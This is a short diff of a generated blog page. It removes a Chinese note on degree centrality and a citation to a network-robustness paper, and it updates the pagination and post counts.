-<p>中心性参数(centrality)<strong>度数</strong>，可以用来衡量节点的<strong>重要性程度</strong>——。</p>
-<p>R-index<a href="Schneider C, Moreira A, Andrade Jr J, Havlin S, Herrmann H (2011">[13]</a> Mitigation of malicious attacks on networks. Proceedings of the National Academy of Sciences 108: 3838–3841.)</p>
 
       
     </div>
@@ -1028,7 +998,7 @@
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/5/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><a class="page-number" href="/page/8/">8</a><a class="page-number" href="/page/9/">9</a><a class="page-number" href="/page/10/">10</a><a class="page-number" href="/page/11/">11</a><a class="page-number" href="/page/12/">12</a><span class="space">&hellip;</span><a class="page-number" href="/page/16/">16</a><a class="extend next" rel="next" href="/page/7/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
+    <a class="extend prev" rel="prev" href="/page/5/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><a class="page-number" href="/page/8/">8</a><a class="page-number" href="/page/9/">9</a><a class="page-number" href="/page/10/">10</a><a class="page-number" href="/page/11/">11</a><a class="page-number" href="/page/12/">12</a><span class="space">&hellip;</span><a class="page-number" href="/page/17/">17</a><a class="extend next" rel="next" href="/page/7/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
   </nav>
 
 
@@ -1096,7 +1066,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">159</span>
+          <span class="site-state-item-count">165</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
